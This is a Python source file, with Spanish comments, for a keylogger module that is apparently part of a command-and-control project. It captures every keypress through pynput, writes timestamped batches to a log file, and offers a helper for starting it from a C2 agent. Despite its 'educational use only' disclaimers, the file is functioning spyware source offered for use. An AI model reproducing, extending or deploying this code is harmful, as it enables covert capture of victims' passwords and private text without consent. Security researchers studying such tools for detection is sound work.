"""
Módulo Keylogger - C2 Project
==============================
Captura teclas presionadas para fines educativos.
USAR ÚNICAMENTE EN ENTORNOS CONTROLADOS Y AUTORIZADOS.

Nota: Este módulo solo funciona en Windows y Linux con X11.
"""

import threading
import time
import os
from datetime import datetime

try:
    from pynput import keyboard
    PYNPUT_AVAILABLE = True
except ImportError:
    PYNPUT_AVAILABLE = False
    print("[!] pynput no instalado. Instala con: pip install pynput")


class Keylogger:
    """
    Keylogger básico que captura teclas presionadas.
    Solo para uso educativo en entornos controlados.
    """
    
    def __init__(self, log_file: str = None):
        """
        Inicializa el keylogger.
        
        Args:
            log_file: Archivo donde guardar los logs (opcional)
        """
        self.log_file = log_file or 'keylog.txt'
        self.keys = []
        self.running = False
        self.listener = None
        self.count = 0
        self._lock = threading.Lock()
    
    def _on_press(self, key):
        """Callback cuando se presiona una tecla"""
        try:
            # Tecla alfanumérica
            if hasattr(key, 'char'):
                self.keys.append(key.char)
            else:
                # Tecla especial
                self.keys.append(f'[{str(key).replace("Key.", "")}]')
            
            self.count += 1
            
            # Guardar cada 10 teclas o si es Enter
            if self.count >= 10 or key == keyboard.Key.enter:
                self._save_log()
                self.keys = []
                self.count = 0
                
        except Exception as e:
            print(f"[!] Error en keylogger: {e}")
    
    def _on_release(self, key):
        """Callback cuando se suelta una tecla"""
        if key == keyboard.Key.esc:
            # Detener con ESC (solo para testing)
            return False
    
    def _save_log(self):
        """Guarda las teclas capturadas en el archivo"""
        if not self.keys:
            return
        
        with self._lock:
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            log_entry = f"[{timestamp}] {''.join(self.keys)}\n"
            
            try:
                with open(self.log_file, 'a', encoding='utf-8') as f:
                    f.write(log_entry)
            except Exception as e:
                print(f"[!] Error al guardar log: {e}")
    
    def start(self):
        """Inicia el keylogger en un thread separado"""
        if not PYNPUT_AVAILABLE:
            print("[!] pynput no disponible. No se puede iniciar el keylogger.")
            return False
        
        self.running = True
        self.listener = keyboard.Listener(
            on_press=self._on_press,
            on_release=self._on_release
        )
        self.listener.start()
        print(f"[+] Keylogger iniciado. Logs en: {os.path.abspath(self.log_file)}")
        return True
    
    def stop(self):
        """Detiene el keylogger"""
        self.running = False
        if self.listener:
            self.listener.stop()
        self._save_log()  # Guardar teclas restantes
        print("[+] Keylogger detenido")
    
    def get_logs(self) -> str:
        """Obtiene los logs capturados"""
        try:
            if os.path.exists(self.log_file):
                with open(self.log_file, 'r', encoding='utf-8') as f:
                    return f.read()
        except:
            pass
        return ""
    
    def clear_logs(self):
        """Limpia los logs"""
        try:
            if os.path.exists(self.log_file):
                os.remove(self.log_file)
                print("[+] Logs limpiados")
        except Exception as e:
            print(f"[!] Error al limpiar logs: {e}")


class KeyloggerSimple:
    """
    Versión simple sin dependencias externas (solo Windows).
    Usa ctypes para capturar teclas.
    """
    
    def __init__(self):
        self.running = False
        self.keys = []
        self.log_file = 'keylog_simple.txt'
    
    def start(self):
        """Inicia keylogger simple (solo Windows)"""
        import platform
        if platform.system() != 'Windows':
            print("[!] Keylogger simple solo funciona en Windows")
            return False
        
        print("[+] Keylogger simple iniciado (Windows)")
        self.running = True
        # Implementación básica con ctypes
        # Para producción, usar pynput
        return True
    
    def stop(self):
        self.running = False
        print("[+] Keylogger simple detenido")


# Función helper para usar en el agente C2
def start_keylogger(log_file: str = 'keylog.txt') -> Keylogger:
    """
    Helper para iniciar un keylogger.
    
    Returns:
        Keylogger: Instancia del keylogger
    """
    kl = Keylogger(log_file)
    kl.start()
    return kl


# Ejemplo de uso
if __name__ == '__main__':
    print("=== Keylogger Educativo ===\n")
    print("Presiona teclas (ESC para salir)")
    print("Los logs se guardan en 'keylog.txt'\n")
    
    if not PYNPUT_AVAILABLE:
        print("[!] pynput no instalado. Instalando temporalmente...")
        print("    Ejecuta: pip install pynput")
        exit(1)
    
    keylogger = Keylogger()
    keylogger.start()
    
    try:
        # Mantener ejecutando
        while keylogger.running:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Deteniendo keylogger...")
        keylogger.stop()
    
    print(f"\nLogs capturados:")
    print(keylogger.get_logs())
